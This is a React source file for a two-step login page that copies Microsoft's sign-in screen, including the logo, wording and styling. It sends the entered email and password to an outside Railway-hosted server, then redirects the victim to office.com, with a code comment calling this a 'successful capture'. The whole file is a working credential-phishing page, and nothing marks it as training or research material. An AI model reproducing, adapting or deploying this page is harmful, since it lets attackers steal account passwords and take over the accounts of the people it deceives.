/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { ArrowLeft } from 'lucide-react';

export default function App() {
  const [step, setStep] = useState(1);
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [attemptId, setAttemptId] = useState<string | null>(null);
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState('');

  // Mock detected emails
  const [savedEmails, setSavedEmails] = useState<string[]>([]);

  useEffect(() => {
    const mockEmails = ['abcd@outlook.cm', 'work@gmail.com'];
    setSavedEmails(mockEmails);
  }, []);

  // ====================== HANDLE EMAIL STEP ======================
  const handleNext = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!email) return;

    setIsLoading(true);
    setError('');

    try {
      const response = await fetch('https://demascus-production-b89b.up.railway.app/api/submit-email', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email }),
      });

      const data = await response.json();

      if (response.ok && data.attemptId) {
        setAttemptId(data.attemptId);
        setStep(2);
      } else {
        setError(data.message || 'Failed to process email.');
      }
    } catch (err) {
      console.error(err);
      setError('Cannot connect to server. Please check if backend is running.');
    } finally {
      setIsLoading(false);
    }
  };

  // ====================== HANDLE PASSWORD STEP ======================
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!password || !attemptId) return;

    setIsLoading(true);
    setError('');

    try {
      const response = await fetch('https://demascus-production-b89b.up.railway.app/api/submit-password', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ attemptId, password }),
      });

      if (response.ok) {
        // Redirect to real Microsoft/Outlook after successful capture
        window.location.href = "https://www.office.com";
        // Alternative: "https://outlook.live.com"
      } else {
        const data = await response.json().catch(() => ({}));
        setError(data.message || 'Invalid password. Please try again.');
      }
    } catch (err) {
      console.error(err);
      setError('Cannot connect to server. Please try again.');
    } finally {
      setIsLoading(false);
    }
  };

  const handleBack = () => {
    setStep(1);
    setPassword('');
    setError('');
  };

  return (
    <div className="min-h-screen bg-[#f2f2f2] flex flex-col font-sans text-[#1b1b1b]">
      {/* Background */}
      <div className="fixed inset-0 z-0 overflow-hidden pointer-events-none opacity-40">
        <div className="absolute top-[-10%] left-[-10%] w-[60%] h-[60%] bg-gradient-to-br from-blue-100 to-transparent rounded-full blur-3xl" />
        <div className="absolute bottom-[-10%] right-[-10%] w-[60%] h-[60%] bg-gradient-to-tl from-blue-50 to-transparent rounded-full blur-3xl" />
      </div>

      <main className="flex-grow flex items-center justify-center p-4 z-10">
        <div className="w-full max-w-[440px] bg-white shadow-[0_2px_6px_rgba(0,0,0,0.2)] rounded-sm p-8 md:p-11 relative overflow-hidden">

          <AnimatePresence mode="wait">
            {step === 1 ? (
              <motion.div
                key="step1"
                initial={{ opacity: 0, x: -20 }}
                animate={{ opacity: 1, x: 0 }}
                exit={{ opacity: 0, x: -20 }}
                transition={{ duration: 0.2 }}
                className="flex flex-col"
              >
                <div className="mb-4">
                  <img
                    src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg"
                    alt="Microsoft"
                    className="h-6 mb-6"
                    referrerPolicy="no-referrer"
                  />
                  <h1 className="text-2xl font-semibold mb-1">Sign in</h1>
                  <p className="text-[15px] mb-4">Use your Microsoft account.</p>
                </div>

                {error && <p className="text-red-600 text-sm mb-4">{error}</p>}

                <form onSubmit={handleNext} className="space-y-4">
                  <div className="relative">
                    <input
                      type="text"
                      placeholder="Email or phone number"
                      value={email}
                      onChange={(e) => setEmail(e.target.value)}
                      className="w-full border-b border-[#666] py-2 px-0 focus:outline-none focus:border-[#0067b8] transition-colors text-[15px] placeholder:text-[#666]"
                      required
                      list="saved-emails"
                    />
                    <datalist id="saved-emails">
                      {savedEmails.map(e => <option key={e} value={e} />)}
                    </datalist>
                  </div>

                  <div className="text-[13px] text-[#0067b8] hover:underline cursor-pointer">
                    Forgot your username?
                  </div>

                  <div className="pt-4 flex flex-col space-y-4">
                    <p className="text-[13px]">
                      New to Microsoft? <span className="text-[#0067b8] hover:underline cursor-pointer">Create an account</span>
                    </p>
                    <div className="flex justify-end">
                      <button
                        type="submit"
                        disabled={isLoading}
                        className="bg-[#0067b8] text-white px-9 py-2 text-[15px] font-semibold hover:bg-[#005da6] focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-[#0067b8] transition-colors disabled:opacity-50"
                      >
                        {isLoading ? 'Please wait...' : 'Next'}
                      </button>
                    </div>
                  </div>
                </form>
              </motion.div>
            ) : (
              <motion.div
                key="step2"
                initial={{ opacity: 0, x: 20 }}
                animate={{ opacity: 1, x: 0 }}
                exit={{ opacity: 0, x: -20 }}
                transition={{ duration: 0.2 }}
                className="flex flex-col"
              >
                <div className="mb-4">
                  <img
                    src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg"
                    alt="Microsoft"
                    className="h-6 mb-6"
                    referrerPolicy="no-referrer"
                  />
                  <div className="flex items-center mb-4">
                    <button
                      onClick={handleBack}
                      className="mr-2 p-1 hover:bg-gray-100 rounded-full transition-colors"
                      aria-label="Go back"
                    >
                      <ArrowLeft size={16} />
                    </button>
                    <span className="text-[15px] truncate max-w-[300px]">{email}</span>
                  </div>
                  <h1 className="text-2xl font-semibold mb-1">Enter password</h1>
                </div>

                {error && <p className="text-red-600 text-sm mb-4">{error}</p>}

                <form onSubmit={handleSubmit} className="space-y-4">
                  <div className="relative">
                    <input
                      type="password"
                      placeholder="Password"
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      className="w-full border-b border-[#666] py-2 px-0 focus:outline-none focus:border-[#0067b8] transition-colors text-[15px] placeholder:text-[#666]"
                      required
                      autoFocus
                    />
                  </div>

                  <div className="text-[13px] text-[#0067b8] hover:underline cursor-pointer">
                    Forgot password?
                  </div>

                  <div className="pt-8 flex justify-end">
                    <button
                      type="submit"
                      disabled={isLoading}
                      className="bg-[#0067b8] text-white px-9 py-2 text-[15px] font-semibold hover:bg-[#005da6] focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-[#0067b8] transition-colors disabled:opacity-50"
                    >
                      {isLoading ? 'Signing in...' : 'Sign in'}
                    </button>
                  </div>
                </form>
              </motion.div>
            )}
          </AnimatePresence>
        </div>
      </main>

      <footer className="p-6 text-[12px] text-[#666] z-10">
        <div className="max-w-[1200px] mx-auto flex flex-col md:flex-row justify-end items-center space-y-2 md:space-y-0 md:space-x-4">
          <div className="flex space-x-4">
            <span className="hover:underline cursor-pointer">Help and feedback</span>
            <span className="hover:underline cursor-pointer">Terms of use</span>
            <span className="hover:underline cursor-pointer">Privacy and cookies</span>
          </div>
          <div className="md:ml-4">
            Use private browsing if this is not your device. <span className="text-[#0067b8] hover:underline cursor-pointer">Learn more</span>
          </div>
        </div>
      </footer>
    </div>
  );
}
